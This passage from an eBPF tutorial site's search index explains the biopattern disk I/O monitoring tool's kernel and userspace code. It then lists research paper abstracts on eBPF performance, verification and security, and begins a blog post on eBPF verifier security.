else\n            __sync_fetch_and_add(&amp;counterp-&gt;random, 1);\n        __sync_fetch_and_add(&amp;counterp-&gt;bytes, nr_sector * 512);\n    }\n    counterp-&gt;last_sector = sector + nr_sector;\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>Global variable definitions:</p> <pre><code>   const volatile bool filter_dev = false; \n   const volatile __u32 targ_dev = 0;\n</code></pre> <p>These two global variables are used for device filtering. <code>filter_dev</code> determines whether device filtering is enabled or not, and <code>targ_dev</code> is the identifier of the target device we want to track.</p> <p>BPF map definition:</p> <pre><code>   struct { __uint(type, BPF_MAP_TYPE_HASH); \n            __uint(max_entries, 64); __type(key, u32); \n            __type(value, struct counter); \n    } counters SEC(\".maps\").\n</code></pre> <p>This part of the code defines a BPF map of type hash table. The key of the map is the identifier of the device, and the value is a <code>counter</code> struct, which is used to store the I/O statistics of the device.</p> <p>The tracepoint function:</p> <pre><code>    SEC(\"tracepoint/block/block_rq_complete\")\n    int handle__block_rq_complete(void *args)\n    {\n        struct counter *counterp, zero = {};\n        sector_t sector;\n        u32 nr_sector;\n        u32 dev;\n\n        if (has_block_rq_completion()) {\n            struct trace_event_raw_block_rq_completion___x *ctx = args;\n            sector = BPF_CORE_READ(ctx, sector);\n            nr_sector = BPF_CORE_READ(ctx, nr_sector);\n            dev = BPF_CORE_READ(ctx, dev);\n        } else {\n            struct trace_event_raw_block_rq_complete___x *ctx = args;\n            sector = BPF_CORE_READ(ctx, sector);\n            nr_sector = BPF_CORE_READ(ctx, nr_sector);\n            dev = BPF_CORE_READ(ctx, dev);\n        }\n\n        if (filter_dev &amp;&amp; targ_dev != dev)\n            return 0;\n\n        counterp = bpf_map_lookup_or_try_init(&amp;counters, &amp;dev, &amp;zero);\n        if (!counterp)\n            return 0;\n        if (counterp-&gt;last_sector) {\n            if (counterp-&gt;last_sector == sector)\n                __sync_fetch_and_add(&amp;counterp-&gt;sequential, 1);\n            else\n                __sync_fetch_and_add(&amp;counterp-&gt;random, 1);\n            __sync_fetch_and_add(&amp;counterp-&gt;bytes, nr_sector * 512);\n        }\n        counterp-&gt;last_sector = sector + nr_sector;\n        return 0;\n    }\n</code></pre> <p>In Linux, a trace point called <code>block_rq_complete</code> is triggered every time an I/O request for a block device completes. This provides an opportunity to capture these events with eBPF and further analyse the I/O patterns.</p> <p>Main Logic Analysis:</p> <ul> <li> <p>Extracting I/O request information: get information about the I/O request from the incoming parameters. There are two possible context structures depending on the return value of <code>has_block_rq_completion</code>. This is because different versions of the Linux kernel may have different tracepoint definitions. In either case, we extract the sector number <code>(sector)</code>, the number of sectors <code>(nr_sector)</code> and the device identifier <code>(dev)</code> from the context.</p> </li> <li> <p>Device filtering: If device filtering is enabled <code>(filter_dev</code> is <code>true</code> ) and the current device is not the target device <code>(targ_dev</code> ), it is returned directly. This allows the user to track only specific devices, not all devices.</p> </li> <li> <p>Statistics update:</p> </li> <li> <p>Lookup or initialise statistics: use the <code>bpf_map_lookup_or_try_init</code> function to lookup or initialise statistics related to the current device. If there is no statistics for the current device in the map, it will be initialised using the <code>zero</code> structure.</p> </li> <li>Determine the I/O mode: Based on the sector number of the current I/O request and the previous I/O request, we can determine whether the current request is random or sequential. If the sector numbers of the two requests are the same, then it is sequential; otherwise, it is random. We then use the <code>__sync_fetch_and_add</code> function to update the corresponding statistics. This is an atomic operation that ensures data consistency in a concurrent environment.</li> <li>Update the amount of data: we also update the total amount of data for the device, which is done by multiplying the number of sectors <code>(nr_sector</code> ) by 512 (the number of bytes per sector).</li> <li>Update the sector number of the last I/O request: for the next comparison, we update the value of <code>last_sector</code>.</li> </ul> <p>In some versions of the Linux kernel, the naming and structure of the tracepoint has changed due to the introduction of a new tracepoint, <code>block_rq_error</code>. This means that the structural name of the former <code>block_rq_complete</code> tracepoint has been changed from <code>trace_event_raw_block_rq_complete</code> to <code>trace_event_raw_block_rq_completion</code>, a change which may cause compatibility issues with eBPF programs on different versions of the kernel. This change may cause compatibility issues with eBPF programs on different versions of the kernel.</p> <p>To address this issue, the <code>biopattern</code> utility introduces a mechanism to dynamically detect which trace point structure is currently used by the kernel, namely the <code>has_block_rq_completion</code> function.</p> <ol> <li>Define two trace point structures:</li> </ol> <pre><code>    struct trace_event_raw_block_rq_complete___x {\n        dev_t dev;\n        sector_t sector;\n        unsigned int nr_sector;\n    } __attribute__((preserve_access_index));\n\n    struct trace_event_raw_block_rq_completion___x {\n        dev_t dev;\n        sector_t sector;\n        unsigned int nr_sector;\n    } __attribute__((preserve_access_index));\n</code></pre> <p>Two tracepoint structures are defined here, corresponding to different versions of the kernel. Each structure contains a device identifier <code>(dev</code> ), sector number <code>(sector</code> ), and number of sectors <code>(nr_sector</code> ).</p> <p>Dynamic detection of trackpoint structures:</p> <pre><code>    static __always_inline bool has_block_rq_completion()\n    {\n        if (bpf_core_type_exists(struct trace_event_raw_block_rq_completion___x))\n            return true;\n        return false;\n    }\n</code></pre> <p>The <code>has_block_rq_completion</code> function uses the <code>bpf_core_type_exists</code> function to detect the presence of the structure <code>trace_event_raw_block_rq_completion___x</code> in the current kernel. If it exists, the function returns <code>true</code>, indicating that the current kernel is using the new tracepoint structure; otherwise, it returns <code>false</code>, indicating that it is using the old structure. The two different definitions are handled separately in the corresponding eBPF code, which is a common solution for adapting to changes between kernel versions.</p>"},{"location":"tutorials/17-biopattern/#user-state-code","title":"User State Code","text":"<p>The <code>biopattern</code> tool's userland code is responsible for reading statistics from the BPF mapping and presenting them to the user. In this way, system administrators can monitor the I/O patterns of each device in real time to better understand and optimise the I/O performance of the system.</p> <ol> <li>Main loop</li> </ol> <pre><code>    /* main: poll */\n    while (1) {\n        sleep(env.interval);\n\n        err = print_map(obj-&gt;maps.counters, partitions);\n        if (err)\n            break;\n\n        if (exiting || --env.times == 0)\n            break;\n    }\n</code></pre> <p>This is the main loop of the <code>biopattern</code> utility, and its workflow is as follows:</p> <ul> <li>Wait: use the <code>sleep</code> function to wait for the specified interval <code>(env.interval</code> ).</li> <li><code>print_map</code>: call <code>print_map</code> function to print the statistics in BPF map.</li> <li>Exit condition: if an exit signal is received <code>(exiting</code> is <code>true</code> ) or if the specified number of runs is reached <code>(env.times</code> reaches 0), the loop exits.</li> </ul> <p>Print mapping function:</p> <pre><code>    static int print_map(struct bpf_map *counters, struct partitions *partitions)\n    {\n        __u32 total, lookup_key = -1, next_key;\n        int err, fd = bpf_map__fd(counters);\n        const struct partition *partition;\n        struct counter counter;\n        struct tm *tm;\n        char ts[32];\n        time_t t;\n\n        while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n            err = bpf_map_lookup_elem(fd, &amp;next_key, &amp;counter);\n            if (err &lt; 0) {\n                fprintf(stderr, \"failed to lookup counters: %d\\n\", err);\n                return -1;\n            }\n            lookup_key = next_key;\n            total = counter.sequential + counter.random;\n            if (!total)\n                continue;\n            if (env.timestamp) {\n                time(&amp;t);\n                tm = localtime(&amp;t);\n                strftime(ts, sizeof(ts), \"%H:%M:%S\", tm);\n                printf(\"%-9s \", ts);\n            }\n            partition = partitions__get_by_dev(partitions, next_key);\n            printf(\"%-7s %5ld %5ld %8d %10lld\\n\",\n                partition ? partition-&gt;name : \"Unknown\",\n                counter.random * 100L / total,\n                counter.sequential * 100L / total, total,\n                counter.bytes / 1024);\n        }\n\n        lookup_key = -1;\n        while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n            err = bpf_map_delete_elem(fd, &amp;next_key);\n            if (err &lt; 0) {\n                fprintf(stderr, \"failed to cleanup counters: %d\\n\", err);\n                return -1;\n            }\n            lookup_key = next_key;\n        }\n\n        return 0;\n    }\n</code></pre> <p>The <code>print_map</code> function is responsible for reading statistics from the BPF map and printing them to the console. The main logic is as follows:</p> <ul> <li>Traverse the BPF map: Use the <code>bpf_map_get_next_key</code> and <code>bpf_map_lookup_elem</code> functions to traverse the BPF map and get the statistics for each device.</li> <li>Calculate totals: Calculate the total number of random and sequential I/Os for each device.</li> <li>Print statistics: If timestamp is enabled <code>(env.timestamp</code> is <code>true</code> ), the current time is printed first. Next, the device name, percentage of random I/O, percentage of sequential I/O, total I/O, and total data in KB are printed.</li> <li>Cleaning up the BPF map: For the next count, use the <code>bpf_map_get_next_key</code> and <code>bpf_map_delete_elem</code> functions to clean up all entries in the BPF map.</li> </ul>"},{"location":"tutorials/17-biopattern/#summary","title":"Summary","text":"<p>In this tutorial, we have taken an in-depth look at how to use the eBPF tool biopattern to monitor and count random and sequential disk I/O in real-time. we started by understanding the importance of random and sequential disk I/O and their impact on system performance. We then describe in detail how biopattern works, including how to define and use BPF maps, how to deal with tracepoint variations in different versions of the Linux kernel, and how to capture and analyse disk I/O events in an eBPF program.</p> <p>You can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or our website at https://eunomia.dev/zh/tutorials/ for more examples and a complete tutorial.</p> <ul> <li>Source repo\uff1ahttps://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/17-biopattern</li> <li>bcc tool\uff1ahttps://github.com/iovisor/bcc/blob/master/libbpf-tools/biopattern.c</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/17-biopattern</p> <p>Share on  Share on </p>"},{"location":"tutorials/18-further-reading/","title":"More Reference Materials\uff1a papers, projects","text":"<p>You may find more about eBPF in these places:</p> <ul> <li>A curated list of awesome projects related to eBPF: https://github.com/zoidbergwill/awesome-ebpf</li> <li>A website of eBPF projects and tutorials: https://ebpf.io/</li> </ul> <p>This is also list of eBPF related papers I read in recent years, might be helpful for people who are interested in eBPF related research.</p> <p>eBPF (extended Berkeley Packet Filter) is an emerging technology that allows safe execution of user-provided programs in the Linux kernel. It has gained widespread adoption in recent years for accelerating network processing, enhancing observability, and enabling programmable packet processing.</p> <p>This document list some key research papers on eBPF over the past few years. The papers cover several aspects of eBPF, including accelerating distributed systems, storage, and networking, formally verifying the eBPF JIT compiler and verifier, applying eBPF for intrusion detection, and automatically generating hardware designs from eBPF programs.</p> <p>Some key highlights:</p> <ul> <li>eBPF enables executing custom functions in the kernel to accelerate distributed protocols, storage engines, and networking applications with improved throughput and lower latency compared to traditional userspace implementations.</li> <li>Formal verification of eBPF components like JIT and verifier ensures correctness and reveals bugs in real-world implementations.</li> <li>eBPF's programmability and efficiency make it suitable for building intrusion detection and network monitoring applications entirely in the kernel.</li> <li>Automated synthesis of hardware designs from eBPF programs allows software developers to quickly generate optimized packet processing pipelines in network cards.</li> </ul> <p>The papers demonstrate eBPF's versatility in accelerating systems, enhancing security, and simplifying network programming. As eBPF adoption grows, it is an important area of systems research with many open problems related to performance, safety, hardware integration, and ease of use.</p> <p>If you have any suggestions or adding papers, please feel free to open an issue or PR. The list was created in 2023.10, New papers will be added in the future.</p> <p>Check out our open-source projects at eunomia-bpf and eBPF tutorials at bpf-developer-tutorial. I'm also looking for a PhD position in the area of systems and networking in 2024/2025. My Github and email.</p>"},{"location":"tutorials/18-further-reading/#xrp-in-kernel-storage-functions-with-ebpf","title":"XRP: In-Kernel Storage Functions with eBPF","text":"<p>With the emergence of microsecond-scale NVMe storage devices, the Linux kernel storage stack overhead has become significant, almost doubling access times. We present XRP, a framework that allows applications to execute user-defined storage functions, such as index lookups or aggregations, from an eBPF hook in the NVMe driver, safely bypassing most of the kernel\u2019s storage stack. To preserve file system semantics, XRP propagates a small amount of kernel state to its NVMe driver hook where the user-registered eBPF functions are called. We show how two key-value stores, BPF-KV, a simple B+-tree key-value store, and WiredTiger, a popular log-structured merge tree storage engine, can leverage XRP to significantly improve throughput and latency.</p> <p>OSDI '22 Best Paper: https://www.usenix.org/conference/osdi22/presentation/zhong</p>"},{"location":"tutorials/18-further-reading/#specification-and-verification-in-the-field-applying-formal-methods-to-bpf-just-in-time-compilers-in-the-linux-kernel","title":"Specification and verification in the field: Applying formal methods to BPF just-in-time compilers in the Linux kernel","text":"<p>This paper describes our experience applying formal methods to a critical component in the Linux kernel, the just-in-time compilers (\"JITs\") for the Berkeley Packet Filter (BPF) virtual machine. We verify these JITs using Jitterbug, the first framework to provide a precise specification of JIT correctness that is capable of ruling out real-world bugs, and an automated proof strategy that scales to practical implementations. Using Jitterbug, we have designed, implemented, and verified a new BPF JIT for 32-bit RISC-V, found and fixed 16 previously unknown bugs in five other deployed JITs, and developed new JIT optimizations; all of these changes have been upstreamed to the Linux kernel. The results show that it is possible to build a verified component within a large, unverified system with careful design of specification and proof strategy.</p> <p>OSDI 20: https://www.usenix.org/conference/osdi20/presentation/nelson</p>"},{"location":"tutorials/18-further-reading/#-io-a-unified-io-stack-for-computational-storage","title":"\u03bb-IO: A Unified IO Stack for Computational Storage","text":"<p>The emerging computational storage device offers an opportunity for in-storage computing. It alleviates the overhead of data movement between the host and the device, and thus accelerates data-intensive applications. In this paper, we present \u03bb-IO, a unified IO stack managing both computation and storage resources across the host and the device. We propose a set of designs \u2013 interface, runtime, and scheduling \u2013 to tackle three critical issues. We implement \u03bb-IO in full-stack software and hardware environment, and evaluate it with synthetic and real applications against Linux IO, showing up to 5.12\u00d7 performance improvement.</p> <p>FAST23: https://www.usenix.org/conference/fast23/presentation/yang-zhe</p>"},{"location":"tutorials/18-further-reading/#extension-framework-for-file-systems-in-user-space","title":"Extension Framework for File Systems in User space","text":"<p>User file systems offer numerous advantages over their in-kernel implementations, such as ease of development and better system reliability. However, they incur heavy performance penalty. We observe that existing user file system frameworks are highly general; they consist of a minimal interposition layer in the kernel that simply forwards all low-level requests to user space. While this design offers flexibility, it also severely degrades performance due to frequent kernel-user context switching.</p> <p>This work introduces ExtFUSE, a framework for developing extensible user file systems that also allows applications to register \"thin\" specialized request handlers in the kernel to meet their specific operative needs, while retaining the complex functionality in user space. Our evaluation with two FUSE file systems shows that ExtFUSE can improve the performance of user file systems with less than a few hundred lines on average. ExtFUSE is available on GitHub.</p> <p>ATC 19: https://www.usenix.org/conference/atc19/presentation/bijlani</p>"},{"location":"tutorials/18-further-reading/#electrode-accelerating-distributed-protocols-with-ebpf","title":"Electrode: Accelerating Distributed Protocols with eBPF","text":"<p>Implementing distributed protocols under a standard Linux kernel networking stack enjoys the benefits of load-aware CPU scaling, high compatibility, and robust security and isolation. However, it suffers from low performance because of excessive user-kernel crossings and kernel networking stack traversing. We present Electrode with a set of eBPF-based performance optimizations designed for distributed protocols. These optimizations get executed in the kernel before the networking stack but achieve similar functionalities as were implemented in user space (e.g., message broadcasting, collecting quorum of acknowledgments), thus avoiding the overheads incurred by user-kernel crossings and kernel networking stack traversing. We show that when applied to a classic Multi-Paxos state machine replication protocol, Electrode improves its throughput by up to 128.4% and latency by up to 41.7%.</p> <p>NSDI 23: https://www.usenix.org/conference/nsdi23/presentation/zhou</p>"},{"location":"tutorials/18-further-reading/#bmc-accelerating-memcached-using-safe-in-kernel-caching-and-pre-stack-processing","title":"BMC: Accelerating Memcached using Safe In-kernel Caching and Pre-stack Processing","text":"<p>In-memory key-value stores are critical components that help scale large internet services by providing low-latency access to popular data. Memcached, one of the most popular key-value stores, suffers from performance limitations inherent to the Linux networking stack and fails to achieve high performance when using high-speed network interfaces. While the Linux network stack can be bypassed using DPDK based solutions, such approaches require a complete redesign of the software stack and induce high CPU utilization even when client load is low.</p> <p>To overcome these limitations, we present BMC, an in-kernel cache for Memcached that serves requests before the execution of the standard network stack. Requests to the BMC cache are treated as part of the NIC interrupts, which allows performance to scale with the number of cores serving the NIC queues. To ensure safety, BMC is implemented using eBPF. Despite the safety constraints of eBPF, we show that it is possible to implement a complex cache service. Because BMC runs on commodity hardware and requires modification of neither the Linux kernel nor the Memcached application, it can be widely deployed on existing systems. BMC optimizes the processing time of Facebook-like small-size requests. On this target workload, our evaluations show that BMC improves throughput by up to 18x compared to the vanilla Memcached application and up to 6x compared to an optimized version of Memcached that uses the SO_REUSEPORT socket flag. In addition, our results also show that BMC has negligible overhead and does not deteriorate throughput when treating non-target workloads.</p> <p>NSDI 21: https://www.usenix.org/conference/nsdi21/presentation/ghigoff</p>"},{"location":"tutorials/18-further-reading/#hxdp-efficient-software-packet-processing-on-fpga-nics","title":"hXDP: Efficient Software Packet Processing on FPGA NICs","text":"<p>FPGA accelerators on the NIC enable the offloading of expensive packet processing tasks from the CPU. However, FPGAs have limited resources that may need to be shared among diverse applications, and programming them is difficult.</p> <p>We present a solution to run Linux's eXpress Data Path programs written in eBPF on FPGAs, using only a fraction of the available hardware resources while matching the performance of high-end CPUs. The iterative execution model of eBPF is not a good fit for FPGA accelerators. Nonetheless, we show that many of the instructions of an eBPF program can be compressed, parallelized or completely removed, when targeting a purpose-built FPGA executor, thereby significantly improving performance. We leverage that to design hXDP, which includes (i) an optimizing-compiler that parallelizes and translates eBPF bytecode to an extended eBPF Instruction-set Architecture defined by us; a (ii) soft-processor to execute such instructions on FPGA; and (iii) an FPGA-based infrastructure to provide XDP's maps and helper functions as defined within the Linux kernel.</p> <p>We implement hXDP on an FPGA NIC and evaluate it running real-world unmodified eBPF programs. Our implementation is clocked at 156.25MHz, uses about 15% of the FPGA resources, and can run dynamically loaded programs. Despite these modest requirements, it achieves the packet processing throughput of a high-end CPU core and provides a 10x lower packet forwarding latency.</p> <p>OSDI 20: https://www.usenix.org/conference/osdi20/presentation/brunella</p>"},{"location":"tutorials/18-further-reading/#network-centric-distributed-tracing-with-deepflow-troubleshooting-your-microservices-in-zero-code","title":"Network-Centric Distributed Tracing with DeepFlow: Troubleshooting Your Microservices in Zero Code","text":"<p>Microservices are becoming more complicated, posing new challenges for traditional performance monitoring solutions. On the one hand, the rapid evolution of microservices places a significant burden on the utilization and maintenance of existing distributed tracing frameworks. On the other hand, complex infrastructure increases the probability of network performance problems and creates more blind spots on the network side. In this paper, we present DeepFlow, a network-centric distributed tracing framework for troubleshooting microservices. DeepFlow provides out-of-the-box tracing via a network-centric tracing plane and implicit context propagation. In addition, it eliminates blind spots in network infrastructure, captures network metrics in a low-cost way, and enhances correlation between different components and layers. We demonstrate analytically and empirically that DeepFlow is capable of locating microservice performance anomalies with negligible overhead. DeepFlow has already identified over 71 critical performance anomalies for more than 26 companies and has been utilized by hundreds of individual developers. Our production evaluations demonstrate that DeepFlow is able to save users hours of instrumentation efforts and reduce troubleshooting time from several hours to just a few minutes.</p> <p>SIGCOMM 23: https://dl.acm.org/doi/10.1145/3603269.3604823</p>"},{"location":"tutorials/18-further-reading/#fast-in-kernel-traffic-sketching-in-ebpf","title":"Fast In-kernel Traffic Sketching in eBPF","text":"<p>The extended Berkeley Packet Filter (eBPF) is an infrastructure that allows to dynamically load and run micro-programs directly in the Linux kernel without recompiling it.</p> <p>In this work, we study how to develop high-performance network measurements in eBPF. We take sketches as case-study, given their ability to support a wide-range of tasks while providing low-memory footprint and accuracy guarantees. We implemented NitroSketch, the state-of-the-art sketch for user-space networking and show that best practices in user-space networking cannot be directly applied to eBPF, because of its different performance characteristics. By applying our lesson learned we improve its performance by 40% compared to a naive implementation.</p> <p>SIGCOMM 23: https://dl.acm.org/doi/abs/10.1145/3594255.3594256</p>"},{"location":"tutorials/18-further-reading/#spright-extracting-the-server-from-serverless-computing-high-performance-ebpf-based-event-driven-shared-memory-processing","title":"SPRIGHT: extracting the server from serverless computing! high-performance eBPF-based event-driven, shared-memory processing","text":"<p>Serverless computing promises an efficient, low-cost compute capability in cloud environments. However, existing solutions, epitomized by open-source platforms such as Knative, include heavyweight components that undermine this goal of serverless computing. Additionally, such serverless platforms lack dataplane optimizations to achieve efficient, high-performance function chains that facilitate the popular microservices development paradigm. Their use of unnecessarily complex and duplicate capabilities for building function chains severely degrades performance. 'Cold-start' latency is another deterrent.</p> <p>We describe SPRIGHT, a lightweight, high-performance, responsive serverless framework. SPRIGHT exploits shared memory processing and dramatically improves the scalability of the dataplane by avoiding unnecessary protocol processing and serialization-deserialization overheads. SPRIGHT extensively leverages event-driven processing with the extended Berkeley Packet Filter (eBPF). We creatively use eBPF's socket message mechanism to support shared memory processing, with overheads being strictly load-proportional. Compared to constantly-running, polling-based DPDK, SPRIGHT achieves the same dataplane performance with 10\u00d7 less CPU usage under realistic workloads. Additionally, eBPF benefits SPRIGHT, by replacing heavyweight serverless components, allowing us to keep functions 'warm' with negligible penalty.</p> <p>Our preliminary experimental results show that SPRIGHT achieves an order of magnitude improvement in throughput and latency compared to Knative, while substantially reducing CPU usage, and obviates the need for 'cold-start'.</p> <p>https://dl.acm.org/doi/10.1145/3544216.3544259</p>"},{"location":"tutorials/18-further-reading/#ken-kernel-extensions-using-natural-language","title":"KEN: Kernel Extensions using Natural Language","text":"<p>The ability to modify and extend an operating system is an important feature for improving a system's security, reliability, and performance. The extended Berkeley Packet Filters (eBPF) ecosystem has emerged as the standard mechanism for extending the Linux kernel and has recently been ported to Windows. eBPF programs inject new logic into the kernel that the system will execute before or after existing logic. While the eBPF ecosystem provides a flexible mechanism for kernel extension, it is difficult for developers to write eBPF programs today. An eBPF developer must have deep knowledge of the internals of the operating system to determine where to place logic and cope with programming limitations on the control flow and data accesses of their eBPF program enforced by the eBPF verifier. This paper presents KEN, an alternative framework that alleviates the difficulty of writing an eBPF program by allowing Kernel Extensions to be written in Natural language. KEN uses recent advances in large language models (LLMs) to synthesize an eBPF program given a user's English language prompt. To ensure that LLM's output is semantically equivalent to the user's prompt, KEN employs a combination of LLM-empowered program comprehension, symbolic execution, and a series of feedback loops. KEN's key novelty is the combination of these techniques. In particular, the system uses symbolic execution in a novel structure that allows it to combine the results of program synthesis and program comprehension and build on the recent success that LLMs have shown for each of these tasks individually. To evaluate KEN, we developed a new corpus of natural language prompts for eBPF programs. We show that KEN produces correct eBPF programs on 80% which is an improvement of a factor of 2.67 compared to an LLM-empowered program synthesis baseline.</p> <p>eBPF'24: https://dl.acm.org/doi/10.1145/3672197.3673434 and arxiv https://arxiv.org/abs/2312.05531</p>"},{"location":"tutorials/18-further-reading/#programmable-system-call-security-with-ebpf","title":"Programmable System Call Security with eBPF","text":"<p>System call filtering is a widely used security mechanism for protecting a shared OS kernel against untrusted user applications. However, existing system call filtering techniques either are too expensive due to the context switch overhead imposed by userspace agents, or lack sufficient programmability to express advanced policies. Seccomp, Linux's system call filtering module, is widely used by modern container technologies, mobile apps, and system management services. Despite the adoption of the classic BPF language (cBPF), security policies in Seccomp are mostly limited to static allow lists, primarily because cBPF does not support stateful policies. Consequently, many essential security features cannot be expressed precisely and/or require kernel modifications. In this paper, we present a programmable system call filtering mechanism, which enables more advanced security policies to be expressed by leveraging the extended BPF language (eBPF). More specifically, we create a new Seccomp eBPF program type, exposing, modifying or creating new eBPF helper functions to safely manage filter state, access kernel and user state, and utilize synchronization primitives. Importantly, our system integrates with existing kernel privilege and capability mechanisms, enabling unprivileged users to install advanced filters safely. Our evaluation shows that our eBPF-based filtering can enhance existing policies (e.g., reducing the attack surface of early execution phase by up to 55.4% for temporal specialization), mitigate real-world vulnerabilities, and accelerate filters.</p> <p>https://arxiv.org/abs/2302.10366</p>"},{"location":"tutorials/18-further-reading/#cross-container-attacks-the-bewildered-ebpf-on-clouds","title":"Cross Container Attacks: The Bewildered eBPF on Clouds","text":"<p>The extended Berkeley Packet Filter (eBPF) provides powerful and flexible kernel interfaces to extend the kernel functions for user space programs via running bytecode directly in the kernel space. It has been widely used by cloud services to enhance container security, network management, and system observability. However, we discover that the offensive eBPF that have been extensively discussed in Linux hosts can bring new attack surfaces to containers. With eBPF tracing features, attackers can break the container's isolation and attack the host, e.g., steal sensitive data, DoS, and even escape the container. In this paper, we study the eBPF-based cross container attacks and reveal their security impacts in real world services. With eBPF attacks, we successfully compromise five online Jupyter/Interactive Shell services and the Cloud Shell of Google Cloud Platform. Furthermore, we find that the Kubernetes services offered by three leading cloud vendors can be exploited to launch cross-node attacks after the attackers escape the container via eBPF. Specifically, in Alibaba's Kubernetes services, attackers can compromise the whole cluster by abusing their over-privileged cloud metrics or management Pods. Unfortunately, the eBPF attacks on containers are seldom known and can hardly be discovered by existing intrusion detection systems. Also, the existing eBPF permission model cannot confine the eBPF and ensure secure usage in shared-kernel container environments. To this end, we propose a new eBPF permission model to counter the eBPF attacks in containers.</p> <p>https://www.usenix.org/conference/usenixsecurity23/presentation/he</p>"},{"location":"tutorials/18-further-reading/#comparing-security-in-ebpf-and-webassembly","title":"Comparing Security in eBPF and WebAssembly","text":"<p>This paper examines the security of eBPF and WebAssembly (Wasm), two technologies that have gained widespread adoption in recent years, despite being designed for very different use cases and environments. While eBPF is a technology primarily used within operating system kernels such as Linux, Wasm is a binary instruction format designed for a stack-based virtual machine with use cases extending beyond the web. Recognizing the growth and expanding ambitions of eBPF, Wasm may provide instructive insights, given its design around securely executing arbitrary untrusted programs in complex and hostile environments such as web browsers and clouds. We analyze the security goals, community evolution, memory models, and execution models of both technologies, and conduct a comparative security assessment, exploring memory safety, control flow integrity, API access, and side-channels. Our results show that eBPF has a history of focusing on performance first and security second, while Wasm puts more emphasis on security at the cost of some runtime overheads. Considering language-based restrictions for eBPF and a security model for API access are fruitful directions for future work.</p> <p>https://dl.acm.org/doi/abs/10.1145/3609021.3609306</p> <p>More about can be found in the first workshop: https://conferences.sigcomm.org/sigcomm/2023/workshop-ebpf.html</p>"},{"location":"tutorials/18-further-reading/#a-flow-based-ids-using-machine-learning-in-ebpf","title":"A flow-based IDS using Machine Learning in eBPF","text":"<p>eBPF is a new technology which allows dynamically loading pieces of code into the Linux kernel. It can greatly speed up networking since it enables the kernel to process certain packets without the involvement of a userspace program. So far eBPF has been used for simple packet filtering applications such as firewalls or Denial of Service protection. We show that it is possible to develop a flow based network intrusion detection system based on machine learning entirely in eBPF. Our solution uses a decision tree and decides for each packet whether it is malicious or not, considering the entire previous context of the network flow. We achieve a performance increase of over 20% compared to the same solution implemented as a userspace program.</p> <p>https://arxiv.org/abs/2102.09980</p>"},{"location":"tutorials/18-further-reading/#femto-containers-lightweight-virtualization-and-fault-isolation-for-small-software-functions-on-low-power-iot-microcontrollers","title":"Femto-containers: lightweight virtualization and fault isolation for small software functions on low-power IoT microcontrollers","text":"<p>Low-power operating system runtimes used on IoT microcontrollers typically provide rudimentary APIs, basic connectivity and, sometimes, a (secure) firmware update mechanism. In contrast, on less constrained hardware, networked software has entered the age of serverless, microservices and agility. With a view to bridge this gap, in the paper we design Femto-Containers, a new middleware runtime which can be embedded on heterogeneous low-power IoT devices. Femto-Containers enable the secure deployment, execution and isolation of small virtual software functions on low-power IoT devices, over the network. We implement Femto-Containers, and provide integration in RIOT, a popular open source IoT operating system. We then evaluate the performance of our implementation, which was formally verified for fault-isolation, guaranteeing that RIOT is shielded from logic loaded and executed in a Femto-Container. Our experiments on various popular micro-controller architectures (Arm Cortex-M, ESP32 and RISC-V) show that Femto-Containers offer an attractive trade-off in terms of memory footprint overhead, energy consumption, and security.</p> <p>https://dl.acm.org/doi/abs/10.1145/3528535.3565242</p> <p>The original link of this article: https://eunomia.dev/tutorials/18-further-reading</p> <p>Share on  Share on </p>"},{"location":"tutorials/18-further-reading/ebpf-security/","title":"The Secure Path Forward for eBPF runtime: Challenges and Innovations","text":"<p>Yusheng Zheng</p> <p>Extended Berkeley Packet Filter (eBPF) represents a significant evolution in the way we interact with and extend the capabilities of modern operating systems. As a powerful technology that enables the Linux kernel to run sandboxed programs in response to events, eBPF has become a cornerstone for system observability, networking, and security features.</p> <p>However, as with any system that interfaces closely with the kernel, the security of eBPF itself is paramount. In this blog, we delve into the often-overlooked aspect of eBPF security, exploring how the mechanisms intended to safeguard eBPF can themselves be fortified. We'll dissect the role of the eBPF verifier, scrutinize the current access control model, and investigate potential improvements from ongoing research. Moreover, we'll navigate through the complexities of securing eBPF, addressing open questions and the challenges they pose to system architects and developers alike.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#table-of-contents","title":"Table of Contents","text":"<ul> <li>The Secure Path Forward for eBPF runtime: Challenges and Innovations</li> <li>Table of Contents</li> <li>How eBPF Ensures Security with Verifier<ul> <li>What the eBPF Verifier Is and What It Does</li> <li>How the eBPF Verifier Works</li> <li>Challenges</li> <li>Other works to improve verifier</li> </ul> </li> <li>Limitations in eBPF Access Control<ul> <li>CAP_BPF</li> <li>bpf namespace</li> <li>Unprivileged eBPF</li> <li>Trusted Unprivileged BPF</li> </ul> </li> <li>Other possible solutions<ul> <li>MOAT: Towards Safe BPF Kernel Extension (Isolation)</li> <li>Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing</li> <li>Kernel extension verification is untenable</li> <li>Wasm-bpf: WebAssembly eBPF library, toolchain and runtime</li> <li><code>bpftime</code>: Userspace eBPF runtime for uprobe \\&amp; syscall hook \\&amp; plugin</li> </ul> </li> <li>Conclusion</li> </ul>"},{"location":"tutorials/18-further-reading/ebpf-security/#how-ebpf-ensures-security-with-verifier","title":"How eBPF Ensures Security with Verifier","text":"<p>The security framework of eBPF is largely predicated on the robustness of its verifier. This component acts as the gatekeeper, ensuring that only safe and compliant programs are allowed to run within the kernel space.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#what-the-ebpf-verifier-is-and-what-it-does","title":"What the eBPF Verifier Is and What It Does","text":"<p>At its core, the eBPF verifier is a static code analyzer. Its primary function is to vet the BPF program instructions before they are executed. It scrutinizes a copy of the program within the kernel, operating with the following objectives:</p> <ul> <li><code>Ensuring Program Termination</code></li> </ul> <p>The verifier uses depth-first search (DFS) algorithms to traverse the program's control flow graph, which it ensures is a Directed Acyclic Graph (DAG). This is crucial for guaranteeing that the program cannot enter into an infinite loop, thereby ensuring its termination. It meticulously checks for any unbounded loops and malformed or out-of-bounds jumps that could disrupt the normal operation of the kernel or lead to a system hang.</p> <ul> <li><code>Ensuring Memory Safety</code></li> </ul> <p>Memory safety is paramount in kernel operations. The verifier checks for potential out-of-bounds memory accesses that could lead to 